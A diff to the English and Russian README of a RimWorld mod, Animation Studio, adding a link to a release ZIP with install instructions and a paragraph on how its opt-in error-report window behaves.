@@ -8,6 +8,10 @@ Create scenes, conversations and films directly on your RimWorld map.
 
 ![Built-in dependency manager](https://images.steamusercontent.com/ugc/18378083456434446688/C4B09AE675419759C13CE2185793C37AF7EB21D8/)
 
+**[Installable Studio ZIP — 0.8.14.0132](https://github.com/igorkozakmy-art/Rimworld-Animation-studio/releases/download/v0.8.14.0132/RimWorldAnimationStudio-0.8.14.0132.zip)**
+
+Extract the Studio folder into `RimWorld/Mods`; install Harmony separately. The automatically generated **Source code** archives contain this project page, not the installable mod.
+
 ## Features
 
 - Actors: people, animals, items, buildings, plants and supported vehicles.
@@ -31,6 +35,8 @@ When Workshop is unavailable, the first-run window and compatibility catalog sho
 
 There is no background telemetry or automatic delivery of error reports. Technical logs are written locally. A report is sent to the author only when you explicitly press **Send** in the report window. Opening the window does not send it, and reports queued by older builds are not retried automatically.
 
+On an error, green Send and red Ignore buttons unlock after five seconds. Both choices require confirmation. Only a confirmed server receipt opens an optional suggestion form with a close button. Repeated errors are grouped.
+
 Inspect the local file before sending: it can contain errors, the mod list, scene information, local paths and your Steam ID when available. Local logs are retained after delivery. Written feedback also requires the Send button. Using Steam integration involves requests to Steam while working with dependencies.
 
 ## Community and standard releases
@@ -42,6 +48,10 @@ Search Telegram for **RimRisovod**, Risovod's community channel. The Workshop pa
 [Ko-fi](https://ko-fi.com/Risovod) is an optional way to thank the author. Contributions do not grant special access to updates or features.
 
 ## Русский
+
+**[Установочная сборка студии — 0.8.14.0132](https://github.com/igorkozakmy-art/Rimworld-Animation-studio/releases/download/v0.8.14.0132/RimWorldAnimationStudio-0.8.14.0132.zip)**
+
+Папку студии из ZIP поместите в `RimWorld/Mods`. Harmony устанавливается отдельно. Автоматические архивы **Source code** содержат страницу проекта, а не сборку мода.
 
 Animation Studio — редактор сцен на карте RimWorld: актёры, ключи, группы, камера, бой, способности, ритуалы, звук и видео.
 
